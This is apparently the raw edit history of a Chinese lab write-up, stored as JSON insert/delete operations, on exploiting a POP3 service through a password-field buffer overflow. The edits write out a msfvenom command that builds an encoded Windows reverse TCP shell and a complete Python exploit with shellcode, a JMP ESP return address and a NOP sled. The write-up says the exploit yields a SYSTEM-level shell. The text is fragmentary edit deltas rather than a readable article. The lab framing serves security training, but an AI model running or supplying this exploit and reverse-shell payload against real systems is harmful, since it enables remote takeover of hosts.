"]],[3767,3767],[3772,3772]]],[1579065054645,["whale@Whale",[[1,3787,"\n"]],[3786,3786],[3787,3787]]],[1579065054941,["whale@Whale",[[1,3788,"\n"]],[3787,3787],[3788,3788]]],[1579065060738,["whale@Whale",[[1,3789,"![11]($res/11.PNG)\n\n"]],[3788,3788],[3808,3808]]],[1579065063717,["whale@Whale",[[-1,3788,"\n"]],[3788,3788],[3787,3787]]],[1579065065651,["whale@Whale",[[-1,3807,"\n"],[1,3808,"z"]],[3807,3807],[3808,3808]]],[1579065066181,["whale@Whale",[[-1,3807,"z"],[1,3808,"\n"]],[3808,3808],[3807,3807]]],[1579065095025,["whale@Whale",[[-1,3807,"\n"],[1,3808,"这样直接生成出来的攻击载荷包含坏字符。"]],[3807,3807],[3826,3826]]],[1579065097781,["whale@Whale",[[1,3826,"所以要"]],[3826,3826],[3829,3829]]],[1579065153275,["whale@Whale",[[1,3829,"\n\n"]],[3829,3829],[3830,3830]]],[1579065153476,["whale@Whale",[[1,3831,"\n"]],[3830,3830],[3831,3831]]],[1579065153795,["whale@Whale",[[1,3831,"msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e\r\nx86/shikata_ga_nai -b \"\\x00\\x0a\\x0d\""]],[3831,3831],[3939,3939]]],[1579065216614,[null,[[-1,3901,"\r"],[1,3902,"\n"]],[3901,3901],[3903,3903]]],[1579065216614,[null,[[1,3901,"\r"],[-1,3901,"\n"]],[3903,3903],[3901,3901]]],[1579065159617,["whale@Whale",[[1,3829,"使用"],[-1,3901,"\r"]],[3829,3829],[3831,3831]]],[1579065172739,["whale@Whale",[[1,3698,"\n"]],[3697,3697],[3698,3698]]],[1579065172997,["whale@Whale",[[1,3698,"·"]],[3698,3698],[3699,3699]]],[1579065173708,["whale@Whale",[[-1,3698,"·"]],[3699,3699],[3698,3698]]],[1579065174557,["whale@Whale",[[1,3698,"```"]],[3698,3698],[3701,3701]]],[1579065176338,["whale@Whale",[[1,3791,"```"]],[3791,3791],[3794,3794]]],[1579065177875,["whale@Whale",[[1,3840,"\n"]],[3839,3839],[3840,3840]]],[1579065178892,["whale@Whale",[[1,3840,"```"]],[3840,3840],[3843,3843]]],[1579065181739,["whale@Whale",[[1,3952,"\n"]],[3951,3951],[3952,3952]]],[1579065182391,["whale@Whale",[[-1,3952,"\n"],[1,3953,"```"]],[3952,3952],[3955,3955]]],[1579065194497,["whale@Whale",[[1,3838,"shikata_ga_nai模块进行编码。"]],[3838,3838],[3859,3859]]],[1579065195140,["whale@Whale",[[-1,3858,"。"]],[3859,3859],[3858,3858]]],[1579065195370,["whale@Whale",[[1,3858,"。"]],[3858,3858],[3859,3859]]],[1579065195898,["whale@Whale",[[-1,3858,"。"]],[3859,3859],[3858,3858]]],[1579065200615,["whale@Whale",[[1,3858,"，避免使用坏字符"]],[3858,3858],[3866,3866]]],[1579065207124,["whale@Whale",[[-1,3598,"再次运行exp\n"]],[3597,3605],[3597,3597]]],[1579065207491,["whale@Whale",[[-1,3598,"\n"]],[3597,3597],[3596,3596]]],[1579065231274,["whale@Whale",[[1,3598,"\n"]],[3597,3597],[3598,3598]]],[1579065241745,["whale@Whale",[[1,3598,"返回地址改为跳转到ESPd"]],[3598,3598],[3611,3611]]],[1579065242182,["whale@Whale",[[-1,3610,"d"]],[3611,3611],[3610,3610]]],[1579065246714,["whale@Whale",[[1,3610,"的指令。"]],[3610,3610],[3614,3614]]],[1579065254125,["whale@Whale",[[1,3602,"的数据"]],[3602,3602],[3605,3605]]],[1579065260846,["whale@Whale",[[1,3603,"无效"]],[3603,3603],[3605,3605]]],[1579065274266,["whale@Whale",[[-1,3929,"10.0.0.4"],[1,3937,"kali的IP"]],[3929,3938],[3937,3937]]],[1579065731205,["whale@Whale",[[1,3995,"\n\n"]],[3995,3995],[3996,3996]]],[1579065736998,["whale@Whale",[[-1,3996,"\n"],[1,3997,"## 运行exp"]],[3996,3996],[4004,4004]]],[1579065737332,["whale@Whale",[[1,4004,"\n\n"]],[4004,4004],[4005,4005]]],[1579065737732,["whale@Whale",[[1,4006,"\n"]],[4005,4005],[4006,4006]]],[1579065762329,["whale@Whale",[[-1,4006,"\n"],[1,4007,"`"]],[4006,4006],[4007,4007]]],[1579065762924,["whale@Whale",[[-1,4006,"`"]],[4007,4007],[4006,4006]]],[1579065763933,["whale@Whale",[[-1,4005,"\n"],[1,4006,"```"]],[4006,4006],[4008,4008]]],[1579065764236,["whale@Whale",[[1,4008,"\n\n"]],[4008,4008],[4009,4009]]],[1579065764428,["whale@Whale",[[1,4010,"\n"]],[4009,4009],[4010,4010]]],[1579065765150,["whale@Whale",[[-1,4010,"\n"],[1,4011,"```"]],[4010,4010],[4013,4013]]],[1579065766327,["whale@Whale",[[1,4009,"#!/usr/bin/python\r\nimport socket\r\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n#string='Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'\r\n#string= \"A\"* 2606+ \"B\"*4 + \"C\"*(3500-2606-4)\r\nshellcode = (\"\\xda\\xdd\\xba\\xc3\\x84\\x74\\xa0\\xd9\\x74\\x24\\xf4\\x5e\\x2b\\xc9\\xb1\"\r\n\"\\x52\\x31\\x56\\x17\\x83\\xee\\xfc\\x03\\x95\\x97\\x96\\x55\\xe5\\x70\\xd4\"\r\n\"\\x96\\x15\\x81\\xb9\\x1f\\xf0\\xb0\\xf9\\x44\\x71\\xe2\\xc9\\x0f\\xd7\\x0f\"\r\n\"\\xa1\\x42\\xc3\\x84\\xc7\\x4a\\xe4\\x2d\\x6d\\xad\\xcb\\xae\\xde\\x8d\\x4a\"\r\n\"\\x2d\\x1d\\xc2\\xac\\x0c\\xee\\x17\\xad\\x49\\x13\\xd5\\xff\\x02\\x5f\\x48\"\r\n\"\\xef\\x27\\x15\\x51\\x84\\x74\\xbb\\xd1\\x79\\xcc\\xba\\xf0\\x2c\\x46\\xe5\"\r\n\"\\xd2\\xcf\\x8b\\x9d\\x5a\\xd7\\xc8\\x98\\x15\\x6c\\x3a\\x56\\xa4\\xa4\\x72\"\r\n\"\\x97\\x0b\\x89\\xba\\x6a\\x55\\xce\\x7d\\x95\\x20\\x26\\x7e\\x28\\x33\\xfd\"\r\n\"\\xfc\\xf6\\xb6\\xe5\\xa7\\x7d\\x60\\xc1\\x56\\x51\\xf7\\x82\\x55\\x1e\\x73\"\r\n\"\\xcc\\x79\\xa1\\x50\\x67\\x85\\x2a\\x57\\xa7\\x0f\\x68\\x7c\\x63\\x4b\\x2a\"\r\n\"\\x1d\\x32\\x31\\x9d\\x22\\x24\\x9a\\x42\\x87\\x2f\\x37\\x96\\xba\\x72\\x50\"\r\n\"\\x5b\\xf7\\x8c\\xa0\\xf3\\x80\\xff\\x92\\x5c\\x3b\\x97\\x9e\\x15\\xe5\\x60\"\r\n\"\\xe0\\x0f\\x51\\xfe\\x1f\\xb0\\xa2\\xd7\\xdb\\xe4\\xf2\\x4f\\xcd\\x84\\x98\"\r\n\"\\x8f\\xf2\\x50\\x0e\\xdf\\x5c\\x0b\\xef\\x8f\\x1c\\xfb\\x87\\xc5\\x92\\x24\"\r\n\"\\xb7\\xe6\\x78\\x4d\\x52\\x1d\\xeb\\xb2\\x0b\\x1c\\x83\\x5a\\x4e\\x1e\\x52\"\r\n\"\\x20\\xc7\\xf8\\x3e\\x46\\x8e\\x53\\xd7\\xff\\x8b\\x2f\\x46\\xff\\x01\\x4a\"\r\n\"\\x48\\x8b\\xa5\\xab\\x07\\x7c\\xc3\\xbf\\xf0\\x8c\\x9e\\x9d\\x57\\x92\\x34\"\r\n\"\\x89\\x34\\x01\\xd3\\x49\\x32\\x3a\\x4c\\x1e\\x13\\x8c\\x85\\xca\\x89\\xb7\"\r\n\"\\x3f\\xe8\\x53\\x21\\x07\\xa8\\x8f\\x92\\x86\\x31\\x5d\\xae\\xac\\x21\\x9b\"\r\n\"\\x2f\\xe9\\x15\\x73\\x66\\xa7\\xc3\\x35\\xd0\\x09\\xbd\\xef\\x8f\\xc3\\x29\"\r\n\"\\x69\\xfc\\xd3\\x2f\\x76\\x29\\xa2\\xcf\\xc7\\x84\\xf3\\xf0\\xe8\\x40\\xf4\"\r\n\"\\x89\\x14\\xf1\\xfb\\x40\\x9d\\x01\\xb6\\xc8\\xb4\\x89\\x1f\\x99\\x84\\xd7\"\r\n\"\\x9f\\x74\\xca\\xe1\\x23\\x7c\\xb3\\x15\\x3b\\xf5\\xb6\\x52\\xfb\\xe6\\xca\"\r\n\"\\xcb\\x6e\\x08\\x78\\xeb\\xba\")\r\n\r\n#string= \"A\"* 2606+ \"\\xa3\\x0e\\x4c\\x5f\" + \"C\"*(3500-2606-4)\r\nstring=\"A\"*2606 + \"\\xa3\\x0e\\x4c\\x5f\" + \"\\x90\" * 8 + shellcode\r\ntry:\r\n\tprint \"\\nSending evil buffer...\"\r\n\ts.connect(('192.168.1.103',110)) # connect to IP, POP3 port\r\n\tdata = s.recv(1024) # receive banner\r\n\tprint data # print banner\r\n\ts.send('USER test' +'\\r\\n') # send username \"test\"\r\n\tdata = s.recv(1024) # receive reply\r\n\tprint data # print reply\r\n\t#s.send('PASS test\\r\\n') # send password \"test\"\r\n\ts.send('PASS ' + string + '\\r\\n')\t\r\n\tdata = s.recv(1024)\r\n\tprint data # print reply\r\n\ts.close() # close socket\r\n\tprint \"\\nDone!\"\r\nexcept:\r\n\tprint \"Could not connect to POP3!\""]],[4009,4009],[9009,9009]]],[1579065771583,["whale@Whale",[[-1,4026,"\r"],[-1,4041,"\r"],[-1,4096,"\r"],[-1,6808,"\r"],[-1,6855,"\r"],[-1,6932,"\r"],[-1,6996,"\r"],[-1,7060,"\r"],[-1,7124,"\r"],[-1,7188,"\r"],[-1,7252,"\r"],[-1,7316,"\r"],[-1,7380,"\r"],[-1,7444,"\r"],[-1,7508,"\r"],[-1,7572,"\r"],[-1,7636,"\r"],[-1,7700,"\r"],[-1,7764,"\r"],[-1,7828,"\r"],[-1,7892,"\r"],[-1,7956,"\r"],[-1,8020,"\r"],[-1,8084,"\r"],[-1,8148,"\r"],[-1,8212,"\r"],[-1,8276,"\r"],[-1,8340,"\r"],[-1,8369,"\r"],[-1,8371,"\r"],[-1,8431,"\r"],[-1,8494,"\r"],[-1,8500,"\r"],[-1,8535,"\r"],[-1,8597,"\r"],[-1,8636,"\r"],[-1,8664,"\r"],[-1,8717,"\r"],[-1,8755,"\r"],[-1,8782,"\r"],[-1,8832,"\r"],[-1,8869,"\r"],[-1,8891,"\r"],[-1,8918,"\r"],[-1,8945,"\r"],[-1,8963,"\r"],[-1,8972,"\r"],[-1,9010,""],[1,9013,"\n\n"]],[8966,8966],[8967,8967]]],[1579065780051,["whale@Whale",[[1,8927,"![12]($res/12.PNG)\n\n"]],[8967,8967],[8946,8946]]],[1579065784388,["whale@Whale",[[-1,8927,"![12]($res/12.PNG)\n"]],[8927,8946],[8927,8927]]],[1579065786380,["whale@Whale",[[-1,8927,"\n"]],[8927,8927],[8926,8926]]],[1579065788400,["whale@Whale",[[1,8967,"![12]($res/12.PNG)\n"]],[8967,8967],[8986,8986]]],[1579065791020,["whale@Whale",[[1,8987,"\n"]],[8986,8986],[8987,8987]]],[1579065791329,["whale@Whale",[[-1,8987,"\n"],[1,8988,"z"]],[8987,8987],[8988,8988]]],[1579065792010,["whale@Whale",[[-1,8987,"z"]],[8988,8988],[8987,8987]]],[1579065792957,["whale@Whale",[[-1,8986,"\n"],[1,8987,"z"]],[8987,8987],[8986,8987]]],[1579065793219,["whale@Whale",[[1,8987,"u"]],[8986,8987],[8986,8988]]],[1579065793320,["whale@Whale",[[1,8988,"i"]],[8986,8988],[8986,8989]]],[1579065793591,["whale@Whale",[[1,8989,"'h"]],[8986,8989],[8986,8991]]],[1579065794284,["whale@Whale",[[-1,8989,"'h"]],[8986,8991],[8986,8989]]],[1579065794526,["whale@Whale",[[1,8989,"'z"]],[8986,8989],[8986,8991]]],[1579065795122,["whale@Whale",[[-1,8986,"zui'z"],[1,8991,"最终"]],[8986,8991],[8986,8988]]],[1579065806069,["whale@Whale",[[1,8988,"得到了一个system权限的shell"]],[8988,8988],[9007,9007]]],[1579065808188,["whale@Whale",[[1,9007,"\n\n"]],[9007,9007],[9008,9008]]],[1579065808396,["whale@Whale",[[1,9009,"\n"]],[9008,9008],[9009,9009]]],[1579065836078,["whale@Whale",[[-1,9009,"\n"],[1,9010,"## 分析"]],[9009,9009],[9014,9014]]],[1579065848879,["whale@Whale",[[1,9014,"\n\nstring=\"A\"*2606 + \"\\xa3\\x0e\\x4c\\x5f\" + \"\\x90\" * 8 + shellcode"]],[9014,9014],[9076,9076]]],[1579065851651,["whale@Whale",[[1,9015,"1"]],[9015,9015],[9016,9016]]],[1579065852875,["whale@Whale",[[-1,9015,"1"]],[9016,9016],[9015,9015]]],[1579065853767,["whale@Whale",[[1,9015,"`"]],[9015,9015],[9016,9016]]],[1579065854898,["whale@Whale",[[1,9077,"`"]],[9077,9077],[9078,9078]]],[1579065856331,["whale@Whale",[[1,9015,"\n"]],[9014,9014],[9015,9015]]],[1579065857047,["whale@Whale",[[1,9015,"z"]],[9015,9015],[9016,9016]]],[1579065857650,["whale@Whale",[[-1,9015,"z"]],[9016,9016],[9015,9015]]],[1579065862519,["whale@Whale",[[1,9015,"在上一小节的xep"]],[9015,9015],[9024,9024]]],[1579065863325,["whale@Whale",[[-1,9021,"xep"]],[9024,9024],[9021,9021]]],[1579065880751,["whale@Whale",[[1,9021,"exp中，栈中数据是这样运行的"]],[9021,9021],[9036,9036]]],[1579066302644,[null,[[-1,9038,"\n"],[-1,9099,"`e"],[1,9101,"e`\n"]],[9038,9038],[9104,9104]]],[1579066302644,[null,[[1,9038,"\n"],[1,9098,"`e"],[-1,9098,"e`\n"]],[9104,9104],[9038,9038]]],[1579066250776,["whale@Whale",[[-1,9012,"分析"],[1,9014,"z"]],[9012,9014],[9012,9013]]],[1579066251062,["whale@Whale",[[1,9013,"h"]],[9012,9013],[9012,9014]]],[1579066251173,["whale@Whale",[[1,9014,"i"]],[9012,9014],[9012,9015]]],[1579066251280,["whale@Whale",[[1,9015,"'x"]],[9012,9015],[9012,9017]]],[1579066251903,["whale@Whale",[[-1,9012,"zhi'x"],[1,9017,"执行"]],[9012,9017],[9012,9014]]],[1579066253192,["whale@Whale",[[1,9014,"流程"]],[9014,9014],[9016,9016]]],[1579066788653,[null,[[-1,9040,"\n"],[-1,9101,"`e"],[1,9103,"e`\n"]],[9040,9040],[9106,9106]]],[1579066788653,[null,[[1,9040,"\n"],[1,9100,"`e"],[-1,9100,"e`\n"]],[9106,9106],[9040,9040]]],[1579066754601,["whale@Whale",[[1,9103,"\n"]],[9102,9102],[9103,9103]]],[1579066754849,["whale@Whale",[[1,9104,"\n"]],[9103,9103],[9104,9104]]],[1579066761212,["whale@Whale",[[1,9039,"![13]($res/13.png)\n\n"]],[9104,9104],[9058,9058]]],[1579066769140,["whale@Whale",[[-1,9039,"![13]($res/13.png)\n"]],[9039,9058],[9039,9039]]],[1579066770409,["whale@Whale",[[1,9106,"\n"]],[9103,9103],[9104,9104]]],[1579066771224,["whale@Whale",[[1,9107,"\n"]],[9104,9104],[9105,9105]]],[1579066772547,["whale@Whale",[[1,9105,"![13]($res/13.png)\n"]],[9105,9105],[9124,9124]]],[1579066848638,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579066848639,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579066842422,["whale@Whale",[[1,9125,"[https://whale3070.github.io/training/2020/01/06/06-x/](https://whale3070.github.io/training/2020/01/06/06-x/)"]],[9125,9125],[9235,9235]]],[1579066908646,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579066908647,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579066855493,["whale@Whale",[[-1,9126,"https://whale3070.github.io/training/2020/01/06/06-x/"],[1,9179,"# Sneaky（suid+缓冲区溢出提权）"]],[9126,9179],[9148,9148]]],[1579066858888,["whale@Whale",[[-1,9126,"# "]],[9128,9128],[9126,9126]]],[1579066862127,["whale@Whale",[[1,9125,"\n"]],[9124,9124],[9125,9125]]],[1579066868120,["whale@Whale",[[1,9125,"联系上一篇"]],[9125,9125],[9130,9130]]],[1579066872407,["whale@Whale",[[-1,9130,"\n"]],[9131,9131],[9130,9130]]],[1579066902964,["whale@Whale",[[1,9207,"，我们可以知道，最重要的是在跳转的时候，跳转到shellcode之前"]],[9207,9207],[9241,9241]]],[1579066968643,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579066968643,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579066910813,["whale@Whale",[[1,9229,"的地址是"]],[9229,9229],[9233,9233]]],[1579066911463,["whale@Whale",[[-1,9233,"到"]],[9233,9233],[9233,9233]]],[1579066917815,["whale@Whale",[[1,9227,"**"]],[9227,9227],[9229,9229]]],[1579066919504,["whale@Whale",[[1,9246,"**"]],[9246,9246],[9248,9248]]],[1579066920415,["whale@Whale",[[1,9250,"\n"]],[9248,9248],[9249,9249]]],[1579066921094,["whale@Whale",[[1,9251,"\n"]],[9249,9249],[9250,9250]]],[1579066928110,["whale@Whale",[[1,9250,"这样EIPzh"]],[9250,9250],[9257,9257]]],[1579066928700,["whale@Whale",[[-1,9255,"zh"]],[9257,9257],[9255,9255]]],[1579066934345,["whale@Whale",[[1,9255,"指令指针寄存器"]],[9255,9255],[9262,9262]]],[1579066939858,["whale@Whale",[[-1,9252,"EIP指令指针寄存器"]],[9262,9262],[9252,9252]]],[1579066959596,["whale@Whale",[[1,9252,"程序就会正常向后执行，来执行插入的shellcode，执行"]],[9252,9252],[9281,9281]]],[1579066960336,["whale@Whale",[[-1,9279,"执行"]],[9281,9281],[9279,9279]]],[1579066968248,["whale@Whale",[[1,9279,"从而执行了我们想要的命令。"]],[9279,9279],[9292,9292]]],[1579067028656,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579067028656,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579066979870,["whale@Whale",[[1,9294,"\n"]],[9292,9292],[9293,9293]]],[1579066980078,["whale@Whale",[[1,9295,"\n"]],[9293,9293],[9294,9294]]],[1579067010955,["whale@Whale",[[1,9294,"在本篇中，ESP的具体地址我们是不知道的，因为每一次程序运行，ESPd"]],[9294,9294],[9329,9329]]],[1579067011517,["whale@Whale",[[-1,9328,"d"]],[9329,9329],[9328,9328]]],[1579067027751,["whale@Whale",[[1,9328,"的地址都有可能改变。取而代之的是"]],[9328,9328],[9344,9344]]],[1579067088642,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579067088642,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579067034240,["whale@Whale",[[1,9344,"使用JMP ESP`"]],[9344,9344],[9354,9354]]],[1579067036947,["whale@Whale",[[1,9346,"`"]],[9346,9346],[9347,9347]]],[1579067051002,["whale@Whale",[[1,9355,"命令，让它帮助我们跳转到栈顶。"]],[9355,9355],[9370,9370]]],[1579067063704,["whale@Whale",[[1,9372,"\n"]],[9370,9370],[9371,9371]]],[1579067064061,["whale@Whale",[[1,9373,"\n"]],[9371,9371],[9372,9372]]],[1579067066991,["whale@Whale",[[1,9372,"在"]],[9372,9372],[9373,9373]]],[1579067067835,["whale@Whale",[[-1,9372,"在"]],[9373,9373],[9372,9372]]],[1579067068418,["whale@Whale",[[-1,9373,"\n"]],[9372,9372],[9371,9371]]],[1579067068951,["whale@Whale",[[-1,9372,"\n"]],[9371,9371],[9370,9370]]],[1579067087310,["whale@Whale",[[1,9370,"如图所示，栈底就是一开始接受数据的地方，"]],[9370,9370],[9390,9390]]],[1579067148648,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579067148649,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579067092158,["whale@Whale",[[1,9390,"栈顶就是"]],[9390,9390],[9394,9394]]],[1579067095047,["whale@Whale",[[-1,9391,"顶就是"]],[9394,9394],[9391,9391]]],[1579067113675,["whale@Whale",[[1,9391,"长度是2606，栈顶就是图中红色部分。使用"]],[9391,9391],[9412,9412]]],[1579067120244,["whale@Whale",[[-1,9409,"。使用"]],[9412,9412],[9409,9409]]],[1579067147963,["whale@Whale",[[1,9409,"，使用JMP ESP跳转到红色的部分，然后正常往后执行，就执行了"]],[9409,9409],[9441,9441]]],[1579067208651,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579067208651,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579067150046,["whale@Whale",[[1,9441,"shellcode."]],[9441,9441],[9451,9451]]],[1579067150662,["whale@Whale",[[-1,9450,"."]],[9451,9451],[9450,9450]]],[1579067151175,["whale@Whale",[[1,9450,"。"]],[9450,9450],[9451,9451]]],[1579067166244,["whale@Whale",[[-1,9409,"，"]],[9410,9410],[9409,9409]]],[1579067167152,["whale@Whale",[[1,9409,"。"]],[9409,9409],[9410,9410]]],[1579067168156,["whale@Whale",[[1,9410,"\n"]],[9410,9410],[9411,9411]]],[1579067168691,["whale@Whale",[[1,9411,"\n"]],[9411,9411],[9412,9412]]],[1579067328677,[null,[[-1,9041,"\n"],[-1,9102,"`e"],[1,9104,"e`\n"]],[9041,9041],[9107,9107]]],[1579067328677,[null,[[1,9041,"\n"],[1,9101,"`e"],[-1,9101,"e`\n"]],[9107,9107],[9041,9041]]],[1579067290169,["whale@Whale",[[1,2823,"`"]],[2823,2823],[2824,2824]]],[1579067291185,["whale@Whale",[[1,2836,"`"]],[2836,2836],[2837,2837]]],[1579074844627,[null,[[-1,9043,"\n"],[-1,9104,"`e"],[1,9106,"e`\n"]],[9043,9043],[9109,9109]]],[1579074844628,[null,[[1,9043,"\n"],[1,9103,"`e"],[-1,9103,"e`\n"]],[9109,9109],[9043,9043]]],[1579074830774,["whale@Whale",[[1,237,"https://market.m.taobao.com/app/idleFish-F2e/widle-taobao-rax/page-detail?wh_weex=true&wx_navbar_transparent=true&id=611018864927&ut_sk=1.W8/lRTdqkP8DAINtC46VjcuH_12431167_1579074460376.Copy.detail.611018864927.2609790715&forceFlush=1"]],[237,237],[471,471]]]]]]}